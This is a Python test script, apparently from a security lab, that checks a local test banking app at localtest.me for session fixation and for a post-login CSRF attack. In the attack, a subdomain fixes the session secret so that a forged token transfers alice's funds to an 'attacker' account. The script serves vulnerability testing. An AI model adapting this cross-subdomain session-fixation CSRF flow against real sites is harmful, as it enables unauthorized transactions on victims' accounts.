import requests, random
from bs4 import BeautifulSoup
import os


try:
    PROTOCOL = os.environ['PROTOCOL']
except:
    PROTOCOL = 'http'
TARGET = f'{PROTOCOL}://localtest.me/'
ATTACKER = f'{PROTOCOL}://attack.localtest.me/'
PRIVATE_KEY = './server/localtest.me.crt'


USER1 = 'alice'
PASSWORD1 = USER1
ammount1 = 100
ammount2 = 200


session_cookie_name = 'session'
csrf_form_id = 'csrf_token'
csrf_form_name = '_csrf'

LOGOUT_MESSAGE = '<button type="submit">Login</button>'
CSRF_FAIL_WITHOUT_LOGIN = 'Please login first.'
INVALID_TOKEN = 'Invalid csrf token'


def get_csrf_token(page):
    return BeautifulSoup(page, 'html.parser').find(id = csrf_form_id).attrs['value']

def login_express(user, password):
    r = s.get(TARGET + 'login')
    assert 'Login' in r.text

    try:
        # pre_session_cookie = s.cookies.get_dict()[session_cookie_name]
        pre_session_cookie = s.cookies._cookies['localtest.me']['/'][session_cookie_name]
    except:
        pre_session_cookie = None

    data = {'username' : user, 'password' : password}
    r = s.post(TARGET + 'login', data = data)

    ### Welcome message
    assert f'Welcome {user}.' in r.text

    # post_session_cookie = s.cookies.get_dict()[session_cookie_name]
    post_session_cookie = s.cookies._cookies['localtest.me']['/'][session_cookie_name]
    assert pre_session_cookie == None or pre_session_cookie != post_session_cookie, "Vulnerable to session fixation"

    return r

def logout_express():
    r = s.get(TARGET + 'logout')
    assert LOGOUT_MESSAGE in r.text

def transfer_express(target, ammount, csrf_token):
    data = {'ammount' : ammount, 'target' : target, csrf_form_name : csrf_token}
    return s.post(TARGET + 'transfer', data = data)

def get_balance(page):
    return int(page.split("Your <b>balance</b> is ")[1].split('<br>')[0])



### Test correct functionality
with requests.Session() as s:
    print("[+] Testing login")

    ### Access main page
    r = s.get(TARGET, verify = PRIVATE_KEY)
    assert LOGOUT_MESSAGE in r.text

    ### Fail to perform CSRF protected operation
    csrf_token = get_csrf_token(r.text)
    r = transfer_express(USER1, 100, csrf_token)
    assert CSRF_FAIL_WITHOUT_LOGIN in r.text

    ### Login
    r = login_express(USER1, PASSWORD1)

    ### Success performing CSRF protected operation
    current_balance = get_balance(r.text)
    csrf_token = get_csrf_token(r.text)

    r = transfer_express('attacker', ammount1, csrf_token)
    assert f"Successfully transferred {ammount1} from {USER1} to attacker" in r.text
    current_balance -= ammount1

    r = s.get(TARGET)
    assert f'Welcome {USER1}.' in r.text
    assert str(current_balance) in r.text

    ### Logout
    logout_express()

    print("  - Correct behaviour confirmed")


with requests.Session() as s:
    print("[+] Trying post-login without fixation")

    r_target = s.get(TARGET, verify = PRIVATE_KEY)
    assert LOGOUT_MESSAGE in r_target.text

    ### TARGET LOGIN
    r_target = login_express(USER1, PASSWORD1)
    assert current_balance == get_balance(r_target.text)

    ### ATTACKER tries performing CSRF protected operation on behalf uf USER1 WITHOUT post-fixating the secret
    ### Attacker (wrongly) Setting post-Session
    r_attacker = s.get(ATTACKER, verify = PRIVATE_KEY)
    ### extract csrf token to use later
    csrf_token_attacker = get_csrf_token(r_attacker.text)

    r_attacker = transfer_express('attacker', ammount2, csrf_token_attacker)
    assert r_attacker.status_code == 403
    assert INVALID_TOKEN in r_attacker.text

    logout_express()

    print("  - CSRF attack failed without post-session")


print("[+] Sanity Checks passed")

with requests.Session() as s:
    print("[+] Testing post-login CSRF attack")

    r_target = s.get(TARGET, verify = PRIVATE_KEY)
    assert LOGOUT_MESSAGE in r_target.text

    ### TARGET LOGIN
    r_target = login_express(USER1, PASSWORD1)
    assert current_balance == get_balance(r_target.text)
    
    ### Attacker Setting post-Session
    s.get(ATTACKER, verify = PRIVATE_KEY)
    ## params will be discarded if not in user mode
    r_attacker = s.get(ATTACKER + 'set_post_session', params = {'username' : USER1})
    ### extract csrf token to use later
    csrf_token_attacker = get_csrf_token(r_attacker.text)

    ### ATTACKER Succeeds in performing CSRF protected operation on behalf uf USER1
    r_attacker = transfer_express('attacker', ammount2, csrf_token_attacker)
    assert f"Successfully transferred {ammount2} from {USER1} to attacker" in r_attacker.text, " NOT VULNERABLE to post-login CSRF attack"
    current_balance -= ammount2

    r = s.get(TARGET)
    assert f'Welcome {USER1}.' in r.text
    assert str(current_balance) in r.text

    logout_express()

    print("  - Vulnerable to post-login CSRF attack")
